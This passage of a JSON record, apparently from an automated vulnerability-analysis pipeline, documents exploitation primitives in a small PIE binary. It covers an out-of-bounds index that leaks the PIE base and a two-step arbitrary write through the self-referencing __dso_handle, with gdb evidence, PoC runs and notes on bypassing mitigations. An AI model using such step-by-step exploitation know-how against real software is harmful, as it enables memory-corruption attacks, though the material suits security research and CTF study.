.data, not stack.\"},{\"name\":\"NX\",\"present\":true,\"primitive_impact\":\"NX prevents code execution but does not affect data writes.\"}],\"evidence\":[{\"id\":\"E008\",\"type\":\"STATIC\",\"function\":\"edit_cookie\",\"address\":\"0x16a3-0x16de\",\"description\":\"msg_size[index] read at 0x16b6, msg[index] read at 0x16d2, read(0, msg[index], msg_size[index]-1) at 0x16de. With index -11: msg[-11]=__dso_handle, msg_size[-11]=high4(msg[26]).\"},{\"id\":\"E009\",\"type\":\"DYNAMIC\",\"function\":\"edit_cookie\",\"address\":\"0x16de\",\"description\":\"gdb at read() call: rsi=0x555555558008 (__dso_handle), rdx=0x5554 (21844). Confirms write target is __dso_handle and size is valid small positive.\"},{\"id\":\"E010\",\"type\":\"DYNAMIC\",\"function\":\"edit_cookie\",\"address\":\"0x16e3\",\"description\":\"gdb after read(): rax=0xb (read returned 11 bytes). __dso_handle changed from 0x0000555555558008 to 0x4343434343434343 ('CCCCCCCC'). Write confirmed.\"},{\"id\":\"E011\",\"type\":\"DYNAMIC\",\"function\":\"edit_cookie\",\"address\":\"0x1705\",\"description\":\"PoC: wrote 0x4141414141414141 to __dso_handle. Post-read code dereferences msg[-11][8] = 0x4141414141414149 -> SIGSEGV. Program crashed as expected, confirming the write occurred.\"}],\"verification_result\":{\"executed\":true,\"poc_path\":\"/work/test/poc-BUG-001.py\",\"written_value\":\"0x4141414141414141\",\"read_value\":\"\",\"fault_address\":\"0x4141414141414149\",\"return_code\":-11,\"details\":\"edit_cookie(-11) with 22 prior create_cookie calls: read(0, __dso_handle, 21844) wrote 8 bytes of 0x41 to __dso_handle. gdb confirmed: before write __dso_handle=0x0000555555558008 (self-ref), after write=0x4343434343434343. Post-read deref at 0x4141414141414149 caused SIGSEGV (rc=-11). Target is fixed (__dso_handle at PIE+0x4008), so this is RELATIVE_WRITE not ARB_WRITE.\"},\"confidence\":\"HIGH\",\"notes\":\"This is RELATIVE_WRITE (fixed target __dso_handle), not ARB_WRITE. The write target is always __dso_handle regardless of attacker input. However, because __dso_handle is self-referencing (value == &value), writing to it changes msg[-11] for the next call, enabling the two-step ARB_WRITE (PRIM-004). The indirect kind reflects the 22 create_cookie setup needed to make msg_size[-11] a valid small positive.\"},{\"primitive_id\":\"PRIM-004\",\"type\":\"ARB_WRITE\",\"status\":\"VERIFIED\",\"kind\":\"INDIRECT\",\"source\":{\"bug_id\":\"BUG-001\",\"root_cause\":\"Same signedness mismatch. The self-referencing nature of __dso_handle (msg[-11]) enables a two-step write: Step 1 modifies __dso_handle to attacker-chosen address Y; Step 2 uses the same index to write to *Y.\",\"description\":\"Two-step write via __dso_handle: Step 0 leaks __dso_handle value via read_cookie(-11) to compute PIE base. Step 1: edit_cookie(-11) writes target address Y to __dso_handle (changing msg[-11] to Y). Step 2: edit_cookie(-11) again, now msg[-11]=Y, so read(0, Y, 21844) writes attacker data to *Y. Target Y is attacker-chosen, making this ARB_WRITE.\"},\"chain\":[\"BUG-001\",\"Signedness mismatch: scanf %llu + signed JL\",\"OOB index -11 accesses __dso_handle (self-ref ptr)\",\"Step 0: read_cookie(-11) leaks __dso_handle value -> PIE base\",\"Step 1: edit_cookie(-11) writes target addr Y to __dso_handle\",\"Step 2: edit_cookie(-11) writes data to *Y (msg[-11] now = Y)\",\"ARB_WRITE (target address Y is attacker-controlled)\"],\"controlled_element\":{\"what\":\"Write target address (attacker-chosen Y) AND write value (attacker-controlled stdin data)\",\"how\":\"Step 1: send p64(Y) as read data to modify __dso_handle. Step 2: send payload as read data to write to *Y.\",\"reach_sensitive_operation\":true},\"preconditions\":[{\"id\":\"PC-01\",\"description\":\"All preconditions from PRIM-003 (22 create_cookie calls, index -11 passes JL, msg_size[-11] valid)\",\"necessity\":\"Same setup needed for both steps of the two-step write\",\"verified\":true},{\"id\":\"PC-02\",\"description\":\"__dso_handle must be self-referencing (value == &value) so that writing to *msg[-11] modifies msg[-11] itself\",\"necessity\":\"This is the key structural property enabling the two-step upgrade from RELATIVE_WRITE to ARB_WRITE\",\"verified\":true},{\"id\":\"PC-03\",\"description\":\"PIE base must be known to compute target address Y (leaked via read_cookie(-11) in Step 0)\",\"necessity\":\"Target address Y must be a valid writable address; PIE base needed to compute BSS/data addresses\",\"verified\":true},{\"id\":\"PC-04\",\"description\":\"Step 1 read() must return before Step 2 can proceed. Using pipe stdin, sending 8 bytes + newline causes read() to return 9, allowing program to continue to menu for Step 2.\",\"necessity\":\"If read() blocks (waiting for 21844 bytes), Step 2 cannot be initiated\",\"verified\":true},{\"id\":\"PC-05\",\"description\":\"Post-read check (msg[-11][read_return]) must not crash. After Step 1, msg[-11]=Y, read_return=9, so *(Y+9) must be readable. If Y is a BSS/data address, this is satisfied.\",\"necessity\":\"If the post-read dereference crashes, the program terminates before returning to menu for Step 2\",\"verified\":true}],\"alias_key_findings\":[{\"expression\":\"__dso_handle: value == &value (self-referencing pointer)\",\"alias\":\"msg[-11] = __dso_handle = *(__dso_handle) = __dso_handle itself\",\"implication\":\"Writing to *msg[-11] modifies msg[-11]. This creates a feedback loop: the write target of edit_cookie(-11) is the value of msg[-11], which was just written. Two invocations of the same OOB operation achieve arbitrary address write.\"},{\"expression\":\"msg_size[-11] = high 4 bytes of msg[26] = 0x00005555\",\"alias\":\"4-byte size field aliases high half of 8-byte heap pointer in msg[26]\",\"implication\":\"Heap pointers on 64-bit have form 0x0000XXXX_XXXXXXXX; high 4 bytes = 0x0000XXXX is always a small positive number. This alias is stable across runs (heap is always near PIE base).\"}],\"verification_plan\":{\"method\":\"1. Create 22 cookies. 2. Leak __dso_handle via read_cookie(-11). 3. Step 1: edit_cookie(-11) send p64(&msg[0]) + newline. 4. Step 2: edit_cookie(-11) send 0x4242424242424242 + newline. 5. read_cookie(0) crashes (msg[0] = 0x4242424242424242 = invalid ptr).\",\"environment\":\"Linux x86_64, glibc 2.39, PIE binary\",\"run_command\":\"cd /work/test && python3 poc-BUG-001.py\",\"expected_evidence\":[\"Step 1 completes: __dso_handle = &msg[0] (attacker-chosen address)\",\"Step 2 completes: msg[0] = 0x4242424242424242 (attacker-controlled value)\",\"read_cookie(0) crashes: dereferences 0x4242424242424242 (proving msg[0] was overwritten)\"]},\"mitigations\":[{\"name\":\"PIE\",\"present\":true,\"primitive_impact\":\"PIE randomizes addresses but Step 0 leaks PIE base via read_cookie(-11), enabling computation of any target address. PIE is bypassed by the info leak.\"},{\"name\":\"Full RELRO\",\"present\":true,\"primitive_impact\":\"Full RELRO protects GOT but the two-step write can target any writable memory (BSS, heap, .data). GOT is not the only writable target.\"},{\"name\":\"Canary\",\"present\":true,\"primitive_impact\":\"Canary protects stack but ARB_WRITE can target any writable address, including non-stack regions.\"},{\"name\":\"NX\",\"present\":true,\"primitive_impact\":\"NX prevents direct code execution, but ARB_WRITE to function pointers/GOT (if RELRO were partial) or other writable data structures remains viable. With Full RELRO, GOT is protected, but BSS/heap/data targets are still writable.\"}],\"evidence\":[{\"id\":\"E012\",\"type\":\"STATIC\",\"function\":\"edit_cookie\",\"address\":\"0x16a3-0x16de\",\"description\":\"Same OOB read/write pattern. msg[-11]=__dso_handle (self-ref), msg_size[-11]=high4(msg[26]). The self-referencing property means writing to *msg[-11] modifies msg[-11] for next call.\"},{\"id\":\"E013\",\"type\":\"DYNAMIC\",\"function\":\"read_cookie\",\"address\":\"0x17e1\",\"description\":\"Step 0 leak: read_cookie(-11) outputs __dso_handle value (0x0000555555558008). gdb confirmed rsi=0x555555558008 at printf. PoC: 'Leaked __dso_handle = 0x00005fdd269a9008, PIE base = 0x00005fdd269a5000'.\"},{\"id\":\"E014\",\"type\":\"DYNAMIC\",\"function\":\"edit_cookie\",\"address\":\"0x16de\",\"description\":\"Step 1: edit_cookie(-11) with p64(&msg[0]) sent. gdb confirmed read() target=0x555555558008 (__dso_handle), size=0x5554 (21844). After read: __dso_handle = &msg[0] (attacker-chosen address). PoC: 'Step 1 OK: __dso_handle = 0x00005fdd269a9060'.\"},{\"id\":\"E015\",\"type\":\"DYNAMIC\",\"function\":\"edit_cookie\",\"address\":\"0x16de\",\"description\":\"Step 2: edit_cookie(-11) again. Now msg[-11]=&msg[0], so read(0, &msg[0], 21844) writes to msg[0]. Sent 0x4242424242424242. PoC: 'Step 2 OK: wrote 0x4242424242424242 to *(msg[0])'.\"},{\"id\":\"E016\",\"type\":\"DYNAMIC\",\"function\":\"read_cookie\",\"address\":\"0x17e1\",\"description\":\"Verification: read_cookie(0) crashed because msg[0] was overwritten to 0x4242424242424242 (invalid pointer). printf(\\\"%s\\\", 0x4242424242424242) -> SIGSEGV. This proves the two-step write successfully modified msg[0] at the attacker-chosen address.\"}],\"verification_result\":{\"executed\":true,\"poc_path\":\"/work/test/poc-BUG-001.py\",\"written_value\":\"0x4242424242424242\",\"read_value\":\"\",\"fault_address\":\"0x4242424242424242\",\"return_code\":-11,\"details\":\"Two-step ARB_WRITE verified: Step 0 leaked __dso_handle=0x00005fdd269a9008 (PIE base=0x00005fdd269a5000). Step 1: edit_cookie(-11) wrote &msg[0]=0x00005fdd269a9060 to __dso_handle. Step 2: edit_cookie(-11) wrote 0x4242424242424242 to *(msg[0]). read_cookie(0) crashed (SIGSEGV) because msg[0]=0x4242424242424242 is invalid. Target address Y=&msg[0] was attacker-chosen; written value was attacker-controlled. Meets ARB_WRITE acceptance criteria: two different addresses can be targeted by changing Y in Step 1.\"},\"confidence\":\"HIGH\",\"notes\":\"ARB_WRITE via two-step write using self-referencing __dso_handle. The target address Y is fully attacker-controlled (any writable address can be specified in Step 1). The written value is fully attacker-controlled (sent via stdin in Step 2). This meets the ARB_WRITE acceptance criteria: attacker specifies arbitrary target address Y and writes a value to it. The indirect kind reflects the two-step mechanism (modify pointer slot, then write through it) and the 22 create_cookie setup calls needed.\"}],\"non_primitives\":[{\"primitive_id\":\"NP-001\",\"candidate_type\":\"CRASH\",\"source_bug\":\"BUG-001\",\"reason\":\"When OOB index selects a NULL pointer (e.g., msg[-1] through msg[-3], msg[-5], msg[-7]), read_cookie/edit_cookie dereference NULL, causing SIGSEGV. This is a crash/DOS but does not provide a useful primitive beyond what PRIM-001 through PRIM-004 already cover. The crash at NULL is a side effect of the OOB access, not an independently useful primitive.\"},{\"primitive_id\":\"NP-002\",\"candidate_type\":\"RELATIVE_READ\",\"source_bug\":\"BUG-001\",\"reason\":\"read_cookie with OOB indices that select FILE* pointers (stderr/stdin/stdout) reads FILE structure contents via printf. This is subsumed by PRIM-001/PRIM-002 (INFO_LEAK). The read is relative to the FILE structure address (not attacker-controlled), so it does not qualify as ARB_READ. It is a RELATIVE_READ but is already captured as INFO_LEAK.\"}],\"unresolved\":[]}],\"target_bug\":\"BUG-001\",\"bug_reports\":[],\"impact_reports\":[],\"strategy_reports\":[],\"final_exploit_path\":\"\",\"final_report\":{}}",
